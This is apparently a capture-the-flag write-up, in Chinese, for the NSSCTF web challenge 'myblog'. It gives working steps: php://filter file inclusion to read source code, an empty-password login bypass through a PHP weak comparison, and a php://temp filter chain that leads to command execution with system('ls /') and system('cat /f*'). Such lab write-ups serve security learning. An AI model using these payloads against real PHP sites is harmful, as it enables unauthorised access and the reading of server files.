# NSSCTF Web - myblog

## Flag

`NSSCTF{ec73ce41-a03d-4330-9c0e-092ad3d2cda6}`

## 题型判断

这题本质是 `page` 参数导致的 PHP 文件包含，核心利用点是 PHP 伪协议。

从题目提示可以先想到两件事：

1. `Do you know the PHP pseudo-protocol?`
2. `If you have something to empty...`
3. `Learn more about PHP pseudo-protocol.`

第 1、3 条基本明示先看 `php://filter`。

第 2 条的 `empty` 则是后面登录绕过的关键。

## 第一步：确认 `page` 是文件包含

访问首页：

```text
http://node4.anna.nssctf.cn:23764/index.php?page=home
```

再测试：

```text
http://node4.anna.nssctf.cn:23764/index.php?page=php://filter/read=convert.base64-encode/resource=login
```

页面直接回显了 `login.php` 的 base64 源码，说明这里是典型的包含点，而且 `php://filter` 可用。

## 第二步：读关键源码

读到的关键源码有两处。

`login.php` 末尾：

```php
<?php
require_once("secret.php");
mt_srand($secret_seed);
$_SESSION['password'] = mt_rand();
?>
```

`secret.php`：

```php
<?php
$secret_seed = mt_rand();
?>
```

`admin/user.php` 前面的登录逻辑：

```php
<?php
error_reporting(0);
session_start();
$logined = false;
if (isset($_POST['username']) and isset($_POST['password'])){
	if ($_POST['username'] === "Longlone" and $_POST['password'] == $_SESSION['password']){
		$logined = true;
		$_SESSION['status'] = $logined;
	}
}
if ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){
    echo "<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>";
	die();
}
?>
```

## 第三步：发现空密码登录绕过

题目第二个提示说：

```text
If you have something to empty...
```

这里的关键在于：

```php
$_POST['password'] == $_SESSION['password']
```

这是弱比较。

如果直接向 `admin/user` 发起登录请求，而不是先访问 `login.php`，那么当前 session 里根本没有初始化 `$_SESSION['password']`，它相当于 `NULL`。

这时如果提交空密码：

```text
username=Longlone&password=
```

则会触发：

```php
"" == NULL
```

弱比较结果为真，于是可以直接登录后台。

验证请求：

```bash
curl -i -c cookie.txt -b cookie.txt -d "username=Longlone&password=" "http://node4.anna.nssctf.cn:23764/?page=admin/user"
```

返回的是后台页面而不是报错，说明绕过成功。

## 第四步：尝试上传链，发现不是最优解

后台里确实有文件上传点：

```php
if(isset($_FILES['Files']) and $_SESSION['status'] === true){
    ...
    move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
}
```

我先测试过上传归档伪装图片，再尝试 `zip://` 包装器包含，但这条链没有顺利打通，像是目录或路径解析并不稳定。

不过这一步不是必须的，因为题目真正的解法仍然围绕 PHP 伪协议。

## 第五步：转向 `php://temp` + `php://filter` 做 LFI2RCE

由于包含点会自动在参数后拼接 `.php`，普通 `data://`、上传文件包含都不够稳定。

这时就要利用更经典的思路：

```text
php://filter/.../resource=php://temp
```

`php://temp` 是“空流”，正好对应题目里的 `empty` 提示。

再配合 filter chain，可以从空流里“构造”出任意 PHP 代码，最终达到代码执行。

我本地使用 `php_filter_chain_generator.py` 生成 payload。

先用最小代码验证是否执行成功：

```php
<?=1;?>
```

请求后页面回显了 `1`，说明 filter chain 执行链成立。

## 第六步：列出根目录，定位 flag 文件

接着生成如下代码的 filter chain：

```php
<?php system("ls /");die();?>
```

请求后得到根目录列表：

```text
bin
boot
dev
etc
flllaggggggggg_isssssssssss_heeeeeeeeeere
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
sbin
srv
sys
tmp
usr
var
```

可以看到 flag 文件名是：

```text
/flllaggggggggg_isssssssssss_heeeeeeeeeere
```

## 第七步：读取 flag

为了缩短 payload，直接不用完整文件名，而是用通配：

```php
<?php system("cat /f*");die();?>
```

最终拿到：

```text
NSSCTF{ec73ce41-a03d-4330-9c0e-092ad3d2cda6}
```

## 利用链总结

1. `page` 参数存在文件包含。
2. 用 `php://filter` 读取 `login.php`、`admin/user.php`、`secret.php` 源码。
3. 通过 `admin/user.php` 里的弱比较发现空密码绕过：`"" == NULL`。
4. 登录后台后继续分析，确认上传链不是最稳妥的主解。
5. 根据题目提示转向 `php://temp`。
6. 使用 `php://filter` filter chain 从空流构造 PHP 代码，实现 LFI2RCE。
7. `ls /` 找到异常命名的 flag 文件。
8. `cat /f*` 读取 flag。

## 这题的核心知识点

`php://filter`

`php://temp`

PHP 弱比较

LFI 到 RCE 的 filter chain 利用
